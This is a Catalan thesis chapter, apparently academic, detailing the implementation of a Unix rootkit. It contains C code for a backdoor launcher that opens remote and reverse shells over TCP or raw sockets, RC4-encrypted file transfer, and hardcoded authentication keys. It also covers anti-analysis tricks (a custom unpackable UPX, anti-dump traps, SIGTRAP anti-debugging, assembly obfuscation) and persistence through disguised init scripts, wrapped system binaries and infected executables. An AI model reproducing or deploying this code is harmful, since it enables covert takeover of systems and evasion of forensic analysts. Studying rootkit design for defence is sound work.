\chapter{Solució}

En aquest capítol es mostra amb detall com s'han aconseguit les diferents funcionalitats que ens havíem 
plantejat de bon principi. En ell es comenten els detalls de codi més significatius per a la funcionalitat
tot adjuntant-los quan és necessari. \\

Cal tenir el compte que tot i el reaprofitament de codi, per a realitzar aquest rootkit, s'han hagut de 
picar més de vuit mil línies. Això implica que hi han moltes parts que no apareixen en aquest document, i
per tant, si es vol aprofondir més en algun punt és necessari haver d'anar a consultar directament el codi 
font. \\

Com hem anat veient, les funcionalitats estan disponibles depenen del nivell de privilegis de què disposem. \\

Si sorgeix qualsevol dubte sobre l'objectiu d'alguna funcionalitat, es pot anar al capítol \ref{cap:funcionalitats} per tal de recordar amb més 
detall el perquè d'una funcionalitat concreta. \\

\section{Entorn no privilegiat}

\subsection{Executable ELF estàtic}

Per tal d'aconseguir crear un executable estàtic, s'ha utilitzat una llibreria opensource anomenada 
\href{http://www.google.es/url?sa=t&source=web&ct=res&cd=1&url=http%3A%2F%2Fwww.fefe.de%2Fdietlibc%2F&ei=zZRQStz4PMWrjAftmrinBQ&usg=AFQjCNFno9JYqJ06mbfgwKIZS5J-6zPYEw&sig2=WuvuDzhCaMMslcwtL4xa2A}{\mbox{dietlibc}}.
Aquesta llibreria és compatible amb la majoria de sistemes UNIX, i està pensada per a crear executables estàtics d'un tamany 
molt reduït. \\

Aquesta llibreria implementa gairebé les mateixes funcions que la glibc, i per tant, el fet d'utilitzar-la no ens obliga a gaires canvis en la manera de programar. Fer servir aquesta llibreria
ens lliga a programar el rootkit amb el llenguatge de programació C, però aquesta ja és una elecció que havíem pres de bon principi, ja que per a treballar tant a baix nivell,
necessitem un llenguatge de les característiques del C.\\

Per tal d'utilitzar aquesta llibreria, ens caldrà incloure-la i compilar-la d'una manera especial. Un cop fet això, el compilador et crea un executable estàtic apunt de ser executat.
\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYai[CFLAGS] @PYbe[=] -fno-builtin -Os -fomit-frame-pointer -nostdinc -DNODIETREF  @PYay[$(]EXTRA_CFLAGS@PYay[)] 
\end{Verbatim}
\caption{Flags de compilació utilitzats}
\label{fig:cflags}
\end{figure}

Els flags \ref{fig:cflags} fan que el compilador no inclogui les funcions estandard, i que optimitzi el codi 
per a què l'executable final ocupi el mínim possible.

\subsection{Multiplataforma i multiarquitectura}

Per a que el nostre rootkit sigui multiplataforma i multiarquitectura, ens cal anar amb molta cura alhora de programar les 
seves funcionalitats. En el nostre cas, hem utilitzat en tot moment les funcions definides en l'estandard POSIX, d'aquesta manera a l'hora de provar el nostre rootkit en les diferents arquitectures, els canvis que hem hagut de realitzar, han estat mínims. Detalls com el tamany dels punters, ens afecten directament alhora de la creació
del rootkit, ja que varien entre arquitectures. \\

A l'hora d'amagar-nos, també ens caldrà tenir en compte el sistema on s'està executant el nostre rootkit, ja que la manera de treballar
d'un sistema operatiu respecte un altre, no són gens iguals. \\

S'ha probat el rootkit en diferents versions de GNU/Linux i BSD, en les arquitectures i386 i x86\_64. Tot
i això, se suposa que aquest hauria de funcionar en la majoria de sistemes operatius que compleixin 
l'estandard POSIX.


\subsection{Connexió}

Tal i com hem vist en el disseny del mode de comunicació TCP \ref{sec:TCP}, el rootkit és capaç de quedar-se 
esperant rebre una connexió a un port TCP per part del client. \\

Podem veure en la figura \ref{fig:client_tcp_action2} que per a fer això, primer ens cal inicialitzar el paquet \ref{sec:paquet} de control amb els passwords corresponents, i un cop inicialitzat, enviar-lo cap al launcher per a començar a executar l'acció escollida: 

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaE[// Generate packet]
memcpy(cmdpkt.pass, clientauth, @PYag[20]);
cmdpkt.port @PYbe[=] local_port;
cmdpkt.action @PYbe[=] action;
@PYay[if] (file) memcpy(cmdpkt.bytes, file, strlen(file));

@PYaE[// Send packet]
write(sock, @PYbe[&]cmdpkt, @PYay[sizeof](cmdpkt));
do_action(action, sock, sock, file);
\end{Verbatim}
\caption{client.c::tcp\_action()}
\label{fig:client_tcp_action2}
\end{figure}

\subsection{Obtenció d'una shell i un TTY}

Per a l'obtenció d'una shell lligada a un tty, només ens cal tenir disponible una shell en el sistema o haver compilat el
nostre rootkit, tot afegint-hi la nostre pròpia shell. En aquest cas, just després
d'establir la connexió, el launcher fa un fork per tal de poder gestionar amb un procés exclusiu la connexió i la shell. Això ho podem veure a la figura \ref{fig:launcher_do_action}, just abans de la crida launcher\_shell(). Podem veure en aquesta mateixa figura que depenent de l'usuari que executi el codi, el rootkit utilitzarà un raw socket o no. Això és perquè l'acció 
SHELL, només s'executa en mode RAW i en mode TCP. En mode RAW, el rootkit s'està executant com a usuari privilegiat, i en
mode TCP no.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYay[case] SHELL:
    debug(@PYaB["]@PYaB[Launching shell]@PYao[\n]@PYaB["]);
    @PYay[if] (@PYbe[!]getuid()) {
        debug(@PYaB["]@PYaB[Starting DirectRAW service]@PYao[\n]@PYaB["]);
        r @PYbe[=] create_rawsock_session(rawsocks, ip@PYbe[-]@PYbe[>]s_addr, sport, d@PYbe[-]@PYbe[>]port);
        @PYay[if] (fork()) @PYay[return];
        launcher_shell(r@PYbe[-]@PYbe[>]r@PYZlb[]@PYag[0]@PYZrb[], r@PYbe[-]@PYbe[>]w@PYZlb[]@PYag[1]@PYZrb[]);
        destroy_rawsock_session(r);
    } @PYay[else] {
        @PYay[if] (fork()) @PYay[return];
        launcher_shell(sock, sock);
        close(sock); }
\end{Verbatim}
\caption{launcher.c::do\_action()}
\label{fig:launcher_do_action}
\end{figure}

Un cop tenim
el procés que gestiona la nostre connexió, aquest obre el tty, lliga els seus descriptors de fitxer amb el tty, i executa la shell tal i com veiem a la figura \ref{fig:launcher_launcher_shell}.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
pty @PYbe[=] open(@PYaB["]@PYaB[/dev/ptmx]@PYaB["], O_RDWR);
grantpt(pty);
unlockpt(pty);
tty @PYbe[=] open(ptsname(pty), O_RDWR);
@PYay[if](@PYbe[!](subshell @PYbe[=] fork())) {
    @PYay[if] (fork() @PYbe[!]@PYbe[=] @PYag[0]) exit(@PYag[0]);
    close(pty);
    close(sock);
    @PYaE[// new session to be used with bash]
    setsid();
    ioctl(tty, TIOCSCTTY, @PYaX[NULL]);
    @PYaE[// start using the new tty]
    dup2(tty, @PYag[0]);
    dup2(tty, @PYag[1]);
    dup2(tty, @PYag[2]);
    close(tty);
    @PYay[if] (getuid()) chdir(@PYaB["]@PYaB[/var/tmp]@PYaB["]);
    @PYay[else] chdir(HOME);
    execve(@PYaB["]@PYaB[/bin/bash]@PYaB["], argv_bash, envp);
\end{Verbatim}
\caption{launcher.c::launcher\_shell()}
\label{fig:launcher_launcher_shell}
\end{figure}

Un cop fet això, només falta lligar la connexió amb l'altre extrem del tty. D'aquesta manera les dades que es vagin rebent per la xarxa, s'han de fer arribar a la shell, i les que envia la shell com a sortida, s'han d'enviar de tornada. Podem veure això a la figura \ref{fig:client_client_shell} on es comproba dintre un bucle infinit si hi han dades en el descriptor 0 (entrada estandard) o en el descriptor rsock (descriptor de lectura de la xarxa)

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaE[/* stdin => server */]
@PYay[if] (FD_ISSET(@PYag[0], @PYbe[&]fds)) {
    @PYaJ[int] count @PYbe[=] read(@PYag[0], buf, BUFSIZE);
    @PYay[if] (count @PYbe[<]@PYbe[=] @PYag[0] @PYbe[&]@PYbe[&] (errno @PYbe[!]@PYbe[=] EINTR)) @PYay[break];
    @PYay[if] (memchr(buf, ECHAR, count)) {
        rc4(buf, count, @PYbe[&]rc4_crypt);
        write(wsock, buf, count);
        @PYay[break];
    }
    rc4(buf, count, @PYbe[&]rc4_crypt);
    @PYay[if] (write(wsock, buf, count) @PYbe[<]@PYbe[=] @PYag[0] @PYbe[&]@PYbe[&] (errno @PYbe[!]@PYbe[=] EINTR)) @PYay[break];}
@PYaE[/* server => stdout */]
@PYay[if] (FD_ISSET(rsock, @PYbe[&]fds)) {
    @PYaJ[int] count @PYbe[=] read(rsock, buf, BUFSIZE);
    @PYay[if] (count @PYbe[<]@PYbe[=] @PYag[0] @PYbe[&]@PYbe[&] (errno @PYbe[!]@PYbe[=] EINTR)) @PYay[break];
    rc4(buf, count, @PYbe[&]rc4_decrypt);
    @PYay[if] (memchr(buf, ECHAR, count)) @PYay[break]; @PYaE[// to let server kill client]
    @PYay[if] (write(@PYag[1], buf, count) @PYbe[<]@PYbe[=] @PYag[0] @PYbe[&]@PYbe[&] (errno @PYbe[!]@PYbe[=] EINTR)) @PYay[break];}
\end{Verbatim}
\caption{client.c::client\_shell()}
\label{fig:client_client_shell}
\end{figure}

\subsection{Mode comanda / Mode servei}

Com hem vist anteriorment, podem veure que aquest mode s'escull tot llançant el launcher
amb dos paràmetres, i que en aquest cas tal i com es mostra en la figura \ref{fig:launcher_main},
és el launcher qui es connecta al client.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaJ[int] @PYaL[main](@PYaJ[int] argc, @PYaJ[char] @PYbe[*]@PYbe[*]argv) {
    @PYaE[// Command mode]
    @PYay[if] (argc @PYbe[=]@PYbe[=] @PYag[3]){
        @PYaJ[unsigned] @PYaJ[short] port @PYbe[=] atoi(argv@PYZlb[]@PYag[2]@PYZrb[]);
        @PYaJ[unsigned] @PYaJ[long] ip;
        @PYaJ[char] ipname@PYZlb[]@PYag[64]@PYZrb[];
        @PYaJ[int] sock;
        debug(@PYaB["]@PYaB[Iniciant reverse tty]@PYao[\n]@PYaB["]);
        ip @PYbe[=] resolve(argv@PYZlb[]@PYag[1]@PYZrb[], ipname);
        @PYay[if] (ip @PYbe[=]@PYbe[=] INADDR_NONE) {
            perror(argv@PYZlb[]@PYag[1]@PYZrb[]);
            @PYay[return] @PYag[1];
        }

        debug(@PYaB["]@PYaB[Connecting to %s:%d]@PYao[\n]@PYaB["],ipname,port);
        @PYay[if] ((sock @PYbe[=] launcher_rcon(ip, port))) {
            launcher_shell(sock, sock);
            close(sock);
        }
\end{Verbatim}
\caption{launcher.c::main()}
\label{fig:launcher_main}
\end{figure}

A més, aquesta funcionalitat tracta de no deixar cap procés en execució un cop portada a terme l'acció.

\subsection{Transferència de fitxers}

Per a transferir fitxers entre client i servidor, es segueix gairebé el mateix procediment, independentment de si és un enviament o una recepció. \\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
    rc4_init((@PYaJ[unsigned] @PYaJ[char] @PYbe[*])KEY, @PYay[sizeof](KEY), @PYbe[&]rc4_crypt);

    @PYay[if] ((fd @PYbe[=] open(file, O_RDONLY)) @PYbe[>=] @PYag[0]) {
        size @PYbe[=] lseek(fd, @PYag[0], SEEK_END);
        lseek(fd, @PYag[0], SEEK_SET);
        bytes @PYbe[=] @PYag[0];
        transfered @PYbe[=] @PYag[0];
        printf(@PYaB["]@PYaB[Size: %lu bytes]@PYao[\n]@PYaB["], size);
        @PYay[while] ((bytes @PYbe[=] read(fd, buf, BUFSIZE)) @PYbe[>] @PYag[0]) {
            rc4(buf, bytes, @PYbe[&]rc4_crypt);
            printf(@PYaB["]@PYao[\r]@PYaB[Uploaded: %lu%%]@PYaB["], (transfered@PYbe[/](@PYag[1]@PYbe[+](size@PYbe[/]@PYag[100]))));
        }
        printf(@PYaB["]@PYao[\r]@PYaB[Uploaded: 100%%]@PYao[\n]@PYaB["]);
        printf(@PYaB["]@PYaB[Fitxer %s enviat!]@PYao[\n]@PYaB["], file);
        sleep(@PYag[2]);
    }
\end{Verbatim}
    \caption{client.c::client\_upload()}
    \label{fig:client_client_upload}
\end{figure}

Ambdós casos, en un cantó de la transmisió, caldrà obrir el fitxer, llegir-lo i enviar-lo. En l'altre part,
caldrà crear un fitxer i començar a ompliar-lo amb les dades rebudes. \\

Veiem en la figura \ref{fig:client_client_upload}, que mentre es van llegint dades, aquestes són transferides fins arribar
al moment en què ja no hi han més dades disponibles, que llavors es tanca la connexió. Un cop tancada, el fitxer ja és apunt de ser utilitzat.

\subsection{Comunicació xifrada}

Per tal de xifrar tota la informació enviada per la xarxa, s'ha implementat en C l'algoritme simètric RC4.
S'ha escollit aquest algoritme per la seva senzillesa en la implementació juntament amb la gran seguretat
que ofereix.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYap[inline] @PYaJ[void] @PYaL[rc4] (@PYaJ[unsigned] @PYaJ[char] @PYbe[*]data, @PYaJ[int] len, rc4_ctx @PYbe[*]ctx) {
    @PYaJ[unsigned] @PYaJ[char] @PYbe[*]state @PYbe[=] ctx@PYbe[-]@PYbe[>]state;
    @PYaJ[unsigned] @PYaJ[char] x @PYbe[=] ctx@PYbe[-]@PYbe[>]x;
    @PYaJ[unsigned] @PYaJ[char] y @PYbe[=] ctx@PYbe[-]@PYbe[>]y;
    @PYaJ[int]  i;
    
    @PYay[for] (i @PYbe[=] @PYag[0]; i @PYbe[<] len; i@PYbe[+]@PYbe[+]) {
        @PYaJ[unsigned] @PYaJ[char] xor;
    
        x@PYbe[+]@PYbe[+];
        y @PYbe[=] state@PYZlb[]x@PYZrb[] @PYbe[+] y;
        swap(@PYbe[&]state@PYZlb[]x@PYZrb[], @PYbe[&]state@PYZlb[]y@PYZrb[]);
    
        xor @PYbe[=] state@PYZlb[]x@PYZrb[] @PYbe[+] state@PYZlb[]y@PYZrb[];
        data@PYZlb[]i@PYZrb[] @PYbe[^]@PYbe[=] state@PYZlb[]xor@PYZrb[];
    }
    
    ctx@PYbe[-]@PYbe[>]x @PYbe[=] x;
    ctx@PYbe[-]@PYbe[>]y @PYbe[=] y;
}
\end{Verbatim}

    \caption{rc4.c::rc4() - funció per xifrar/desxifrar}
    \label{fig:rc4_rc4}
\end{figure}

Per utilitzar-lo, ens cal que tant el launcher com el client es trobin en el mateix estat, perquè així,
el contingut xifrat i desxifrat sigui el mateix a ambdós cantons. Per aconseguir això, cal que inicialitzem
dues estructures de control, una la utilitzarem per a xifrar i l'altre per a desxifrar. D'aquesta manera, 
assegurarem que en el moment que anem a desxifrar les dades que hem rebut, tenim el mateix estat que tenia el 
launcher en el moment que ha xifrat.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
rc4_init((@PYaJ[unsigned] @PYaJ[char] @PYbe[*])KEY, @PYay[sizeof](KEY), @PYbe[&]rc4_crypt);
rc4_init((@PYaJ[unsigned] @PYaJ[char] @PYbe[*])KEY, @PYay[sizeof](KEY), @PYbe[&]rc4_decrypt);
\end{Verbatim}
    \caption{Inicialització de les estructures de control per a l'rc4}
    \label{fig:rc4_inits}
\end{figure}

Apart d'aquesta inicialització \ref{fig:rc4_inits}, cal que en els diferents punts del codi on es transfereixen i on es reben 
dades, s'utilitzin les funcions de xifrar i desxifrar amb l'estructura de control corresponent. \\

Si en fixem en l'anterior figura \ref{fig:client_client_shell} veurem que les dades són desxifrades just després de rebre-les
i xifrades just abans d'enviar-les.

\subsection{Autenticació per contrasenya}

En el moment en què es compila el rootkit, aquest ens demana una contrasenya per el launcher que serà la 
què haurà d'utilitzar el client alhora de voler llançar accions sobre un altre launcher. De la 
contrasenya escollida, se'n derivaran tres claus diferents. 

\begin{description}
    \item[CLIENTAUTH] És la requerida pel launcher per a què un paquet enviat pel client sigui considerat 
        vàlid.
    \item[SERVERAUTH] És la requerida pel client per a què un paquet enviat pel launcher sigui considerat
        vàlid.
    \item[RC4KEY] És la clau utilitzada per l'algoritme rc4 per xifrar el contingut dels paquets.
\end{description}

En la figura \ref{fig:config} es veu la definició d'aquestes variables en el fitxer de configuració.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaN[#]@PYaN[define CLIENTAUTH "\xf1\x0e\x28\x21\xbb\xbe\xa5\x27\xea\x02\x20\x3b\xc0\x59\x44\x51\x90"]
@PYaN[#]@PYaN[define SERVERAUTH "\x90\x6f\x49\x40\xda\xdf\xc4\x46\x8b\x63\x41\x5a\xa1\x38\x25\x30\xf1"]
@PYaN[#]@PYaN[define RC4KEY "\x82\x7d\x5b\x52\xc8\xcd\xd6\x54\x99\x71\x53\x70\xb3\x2a\x37\x22\xe3"]
\end{Verbatim}
    \caption{config.h}
    \label{fig:config}
\end{figure}

En la part client, la contrasenya és sol·licitada en el moment d'executar-se. És llavors quan s'inicialitzen les 
diferents claus en base a la contrasenya entrada.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
printf(@PYaB["]@PYaB[password: ]@PYaB["]); fflush(stdout);
fgets(p, @PYag[64], stdin); fflush(stdin);
p@PYZlb[]strlen(p) @PYbe[-] @PYag[1]@PYZrb[] @PYbe[=] @PYac['\0'];
tcsetattr(@PYag[0], TCSAFLUSH, @PYbe[&]old);

sha1((@PYaJ[unsigned] @PYaJ[char] @PYbe[*])p, strlen(p), clientauth);
printf(@PYaB["]@PYao[\n]@PYaB["]);
@PYaJ[int] i @PYbe[=] @PYag[0];
@PYay[for] (i @PYbe[=] @PYag[0]; i @PYbe[<] @PYag[20]; i@PYbe[+]@PYbe[+]) {
    serverauth@PYZlb[]i@PYZrb[] @PYbe[=] clientauth@PYZlb[]i@PYZrb[]@PYbe[^]p@PYZlb[]@PYag[0]@PYZrb[];
}
@PYay[for] (i @PYbe[=] @PYag[0]; i @PYbe[<] @PYag[20]; i@PYbe[+]@PYbe[+]) {
    rc4key@PYZlb[]i@PYZrb[] @PYbe[=] clientauth@PYZlb[]i@PYZrb[]@PYbe[^]p@PYZlb[]@PYag[1]@PYZrb[];
}
\end{Verbatim}
    \caption{client.c::get\_pass()}
    \label{fig:client_get_pass}
\end{figure}

Podem veure a la figura \ref{fig:client_get_pass}, que aquestes tres claus depenen de la clau inicial, i que la segona és generada a partir de la 
primera, així com la tercera a partir de la segona. Obtinguda una d'aquestes claus, o és possible obtenir les altres,
a cada generació s'ha combinat l'algoritme sha1 amb una xor de la paraula entrada inicialment.

\subsection{Detecció del rootkit}
Per tal de detectar si hi ha un rootkit en execució en una màquina remota, s'ha implementat una acció
que pot ser executada independentment del password utilitzat. Com s'ha comentat en punts
anteriors, cada cop que el launcher rep un paquet del tamany exacte, aquest n'extreu de la capçalera 20 
bytes i els compara amb el password que ell té. \\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYay[while] (@PYag[1]) {
    size @PYbe[=] recvfrom(sock, @PYbe[&]p, @PYay[sizeof](p), @PYag[0], (@PYay[struct] sockaddr @PYbe[*]) @PYbe[&]raw, @PYbe[&]slen);
    @PYaE[// Si el tamany del paquet es el que toca]
    @PYay[if] (size @PYbe[=]@PYbe[=] @PYay[sizeof](@PYay[struct] packet)) {
        @PYaE[// I el password és correcte]
        @PYay[if] (@PYbe[!]memcmp(CLIENTAUTH, p.action.pass, @PYag[20])) {
            debug(@PYaB["]@PYaB[S'ha rebut el paquet d'autenticat (action: %d)]@PYao[\n]@PYaB["], p.action.action);
            do_action(@PYbe[&](p.action), @PYbe[&]raw.sin_addr, ntohs(p.tcp.dest), @PYag[0]);
        } @PYay[else] @PYay[if] (@PYbe[!]memcmp(CHECKSTR, p.action.pass, @PYag[20]) 
                @PYbe[&]@PYbe[&] (p.action.action @PYbe[=]@PYbe[=] CHECK @PYbe[|]@PYbe[|] p.action.action @PYbe[=]@PYbe[=] REVCHECK)) {
            debug(@PYaB["]@PYaB[S'ha rebut el paquet de CHECK]@PYao[\n]@PYaB["]);
            do_action(@PYbe[&](p.action), @PYbe[&]raw.sin_addr, ntohs(p.tcp.dest), @PYag[0]);
		}
    }
}
\end{Verbatim}
    \caption{launcher.c::raw\_daemon()}
    \label{fig:raw_daemon}
\end{figure}

Com es pot veure a la figura \ref{fig:raw_daemon}, si un d'aquests paquets no conté el password correcte, també
es comprova si és un paquet de detecció. En cas de ser-ho, es respon per tal de donar a conèixer que 
efectivament en la màquina hi ha un launcher en execució. \\

\subsection{Proteccions de l'executable}
\subsubsection{Xifratge de l'executable}
La primera tècnica utilitzada consisteix en xifrar l'executable per a fer-ne més difícil l'anàlisi. La idea 
és acabar tenint l'executable original xifrat, però afegint al principi de tot, un codi capaç de desxifrar-lo en temps 
d'execució. Un cop l'executable inicial està desxifrat en memòria,
caldrà continuar l'execució en ell per seguir tal i com faria l'executable original. \\

Un altre punt que ens interessa, és que no sigui possible desxifrar l'executable per part d'un tercer que el vulgui 
analitzar sense aquesta protecció. Per aquest motiu, no es podia utilitzar cap programa existent que ens fes això
ja que alhora n'existeix també l'eina per a desxifrar-lo. \\

Per tal d'aconseguir aquestes funcionalitats, es va optar per acabar modificant 
l'última versió del packer UPX\footnote{\href{http://upx.sourceforge.net/}{Ultimate Packer for eXecutables}: 
millor packer públic que existeix avui en dia.}. D'aquesta manera s'ha obtingut un packer molt portable, que alhora 
comprimeix l'executable, i que a més, només és descomprimible per nosaltres. \\

Amb aquesta tècnica, aconseguim que per tal d'analitzar l'executable xifrat, només tinguem dues possibilitats: 
\begin{itemize}
	\item Intentar volcar la memòria, i analitzar aquest volcatge.
	\item Debugar el codi directament en memòria mentre està sent executat.
\end{itemize}

Les millors eines d'anàlisi de binaris necessiten un executable per començar a treballar. Algunes
també permeten treballar amb volcats de memòria, però mai podran mostrar la mateixa quantitat d'informació
ni permetran fer servir les mateixes eines d'anàlisi que quan es disposa de l'executable inicial. En resum,
el què voldrà fer un analista que estigui treballant sobre el nostre executable, és reconstruir un ELF 
a partir de la memòria, per poder així treballar còmodament. \\

Fins fa relativament poc, no existia cap eina pública que permetés fer això en sistemes actuals. Per  
poder aprofundir més en el projecte i durant el transcurs d'aquest, em vaig disposar a implementar-ne una.
Aquesta eina l'anomeno skpd\footnote{\href{http://www.wekk.net/skpd/}{skpd}: sk Process Dump, utilitat per
construir un ELF executable a partir d'un procés en execució.} i permet fer justament això: volcar un procés 
que estigui en execució a la nostre màquina, i construir un ELF que permet que aquest procés pugui tornar a ser llançat. 

\subsubsection{Modificació de l'estat}
Tal i com s'ha vist en el punt anterior, la millor opció és intentar reconstruir un ELF a partir del
procés en execució. \\

Aquesta tècnica de modificar l'estat és aplicada per a posar-ho més difícil, i que llavors aquest 
executable reconstruït o el codi volcat no pugui funcionar directament. \\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaJ[int] simple_anti_spkd @PYbe[=] @PYag[1];

@PYaJ[int] @PYaL[main](@PYaJ[int] argc, @PYaJ[char] @PYbe[*]argv@PYZlb[]@PYZrb[]) {
    @PYay[if] (simple_anti_spkd @PYbe[=]@PYbe[=] @PYag[0] ) @PYbe[*](@PYaJ[int] @PYbe[*])port @PYbe[=] @PYaT[0xdeadfeef];
    simple_anti_spkd @PYbe[=] @PYag[0];
\end{Verbatim}
\caption{launcher.c::main()}
\label{fig:antidebug_modificar_estat}
\end{figure}

Com veiem al codi de la figura \ref{fig:antidebug_modificar_estat}, tracta de crear una variable global que el compilador la situarà a la secció
.bss de l'ELF. L'execució d'aquest codi mai entrarà dintre l'if, ja que al ser llançat el main, la variable 
``simple\_anti\_spkd'' valdrà ``1'', i només valdrà ``0'' després quan ja mai més es torna a comprovar. \\

La utilitat d'aquest tros de codi apareix quan ens plantegem volcar la memòria en un punt de l'execució del 
programa. Si un cop aquest programa s'està executant, en capturem la memòria, el valor de la 
variable ``simple\_anti\_spkd'' ja no serà ``1'', sinó que serà ``0''. Al intentar executar aquest codi
volcat, ens trobarem que només començar l'execució del programa, aquest entra a l'if tot provocant una 
violació de segment provocada per nosaltres.  \\

Per un analista no avançat, molt probablement significarà que la reconstrucció de la memòria no ha anat bé,
o almenys, que no és capaç d'executar-lo.

\subsubsection{Evitar el debug}
Per evitar que ens debuguin el rootkit, aquest contínuament utilitza el signal TRAP (que és el 
què utilitzen els debugers per funcionar). D'aquesta manera el nostre rootkit durant el seu 
funcionament normal, anirà setejant el signal handler pels traps, i llançant interrupcions. Si no és el seu 
signal handler el qui captura la interrupció, aquest provocarà un segmentation fault per finalitzar
de forma sospitosa pel possible analitzador.

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaN[#]@PYaN[define antidebug_sigtrap() \]
@PYaN[    signal(SIGTRAP, antidebug_sigtrap_handler); \]
@PYaN[    __asm__("int3"); \]
@PYaN[    signal(SIGTRAP, SIG_DFL); \]
@PYaN[	if (antidebug_sigtrap_var != 1) { \]
@PYaN[        debug("antidebug_sigtrap reached!\n"); \]
@PYaN[        int segfaultaddr = 0; \]
@PYaN[        *(int *)segfaultaddr = 0xdeadfeef; \]
@PYaN[    } \]
@PYaN[	else antidebug_sigtrap_var = 0; \]
\end{Verbatim}
\caption{antidebug.h}
\label{fig:antidebug_set_sigtrap}
\end{figure}

\subsubsection{Ofuscar el codi}
L'última tècnica utilitzada per a protegir el nostre rootkit, és utilitzada per ofuscar el codi del nostre
executable. L'objectiu d'aquesta tècnica és dificultar l'anàlisi del codi, ja que el què fem és introduir
en el codi, salts a posicions que no poden ser resoltes estàticament.  \\

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYaN[#]@PYaN[define antidebug_obfuscate_analysis(value) \]
@PYaN[__asm__("pushl %eax\n" \]
@PYaN[        "jmp antidebug1" #value " + 2\n" \]
@PYaN[        "antidebug1" #value ":\n" \]
@PYaN[        ".short 0x457c\n" \]
@PYaN[        "call reloc" #value "\n" \]
@PYaN[        "reloc" #value ":\n" \]
@PYaN[        "popl %eax\n"\]
@PYaN[        "jmp antidebug2" #value "\n"\]
@PYaN[        "antidebug2" #value ":\n"\]
@PYaN[        "addl $(data" #value " - reloc" #value " + 4), %eax\n"\]
@PYaN[        "jmp *%eax\n" \]
@PYaN[        "data" #value ":\n" \]
@PYaN[        ".long 0\n" \]
@PYaN[        "popl %eax\n" \]
@PYaN[        );]
\end{Verbatim}
\caption{antidebug.h}
\label{fig:antidebug_obfuscate}
\end{figure}

Per tal de poder aconseguir aquesta obuscació a tant baix nivell, ens cal utilitzar llenguatge ensamblador. \\

Com podem veure a la figura \ref{fig:antidebug_obfuscate}, el què fem és calcular l'adreça que tenim just 
després del nostre codi, i saltar fent servir aquest punter. El call reloc ens deixa a la pila l'adreça de 
retorn, que és exactament l'adreça de memòria on es troba la instrucció popl \%eax. Després, en la operació
addl es calcula la distància entre l'etiqueta data i l'etiqueta reloc, i se li suma a la direcció de memòria
que hem obtingut anteriorment més 4. Aquest càlcul ens retorna la direcció just després d'on hi ha el .long 0 
que són 4 bytes a 0. El jmp *\%eax fa que l'execució salti a aquest punt. \\

Tot això implica que els programes que analitzen
el flux del codi estàticament, no puguin seguir el seu anàlisis. Això és degut a que la següent direcció destí
de la instrucció jmp *\%eax, no es pot saber sense executar les instruccions anteriors. El fet de no poder resoldre aquest
salt atura l'anàlisi en aquest punt. \\

Una altre tècnica que s'implementa en el mateix tros de còdi, és la d'injecció de bytes per a enganyar el
desensamblat. Podem veure en la mateixa figura que a la quarta línia, inserim els bytes 0x457c. Fer això
just en aquest punt, provocarà que els bytes que formen la instrucció call de darrere, siguin utilitzats
juntament amb el 0x457c, trencant així el ``call'' i mostran un ``movl \$0x0,-0x18(\%ebp)''. \\

En la figura \ref{fig:antidebug_obfuscate2} es pot veure el resultat de desensamblar la figura \ref{fig:antidebug_obfuscate}

\begin{figure}[htp]
\begin{Verbatim}[commandchars=@\[\]]
@PYag[804]@PYah[a04c:]       @PYag[50]                      push   @PYbe[%]eax
@PYag[804]@PYah[a04d:]       eb @PYae[02]                   jmp    @PYaT[0x804a051]
@PYag[804]@PYah[a04f:]       c7 @PYag[45] e8 @PYae[00] @PYae[00] @PYae[00] @PYae[00]    movl   @PYaI[$]@PYaT[0x0],@PYbe[-]@PYaT[0x18](@PYbe[%]ebp)
@PYag[804]@PYah[a056:]       @PYag[58]                      pop    @PYbe[%]eax
@PYag[804]@PYah[a057:]       eb @PYae[00]                   jmp    @PYaT[0x804a059]
@PYag[804]@PYah[a059:]       @PYae[05] @PYag[0]e @PYae[00] @PYae[00] @PYae[00]          add    @PYaI[$]@PYaT[0xe],@PYbe[%]eax
@PYag[804]@PYah[a05e:]       ff e0                   jmp    @PYbe[*]@PYbe[%]eax
@PYag[804]@PYah[a060:]       @PYae[00] @PYae[00]                   add    @PYbe[%]al,(@PYbe[%]eax)
@PYag[804]@PYah[a062:]       @PYae[00] @PYae[00]                   add    @PYbe[%]al,(@PYbe[%]eax)
@PYag[804]@PYah[a064:]       @PYag[58]                      pop    @PYbe[%]eax
\end{Verbatim}
	\caption{Resultat de la comanda objdump}
	\label{fig:antidebug_obfuscate2}
\end{figure}

Finalment comentar que aquestes dues tècniques també s'han aplicat en tot el codi del rootkit.

\subsection{Supervivència del rootkit}
Per tal d'aconseguir que el nostre rootkit torni a arrancar, tenim diferents opcions:
\begin{itemize}
\item Colocar un script amb els scripts d'inici del sistema per a què s'arranqui amb el SO.
\item Substituir un executable del sistema per un wrapper nostre.
\item Infectar un executable del sistema per a què en cada execució també executi el nostre programa.
\end{itemize}

\subsubsection{Script d'inici}
En cas d'un Unix System V, una manera d'activar el nostre rootkit cada vegada que la màquina es reiniciés, seria
col·locant un script al directori d'arrancada com per exemple /etc/rc3.d/ amb el nom S99inetd per tal
d'intentar passar desaparcebuts. Al reiniciar el sistema, el nostre rootkit seria executat.

\subsubsection{Substituir executable}
Una segona opció seria renombrar un executable de sistema com podria ser /sbin/getty per algo com /sbin/agetty,
i posar al seu lloc un executable nostre que executés el nostre rootkit, i que alhora llancés el programa 
original. 

\subsubsection{Infecció d'un executable}
Una tècnica més avançada seria infectar un executable per a que ell mateix executés el rootkit just abans 
d'executar-se. Aquest executable també hauria de ser de sistema, ja que ens interessarà que el nostre rootkit
s'executi com a usuari root.

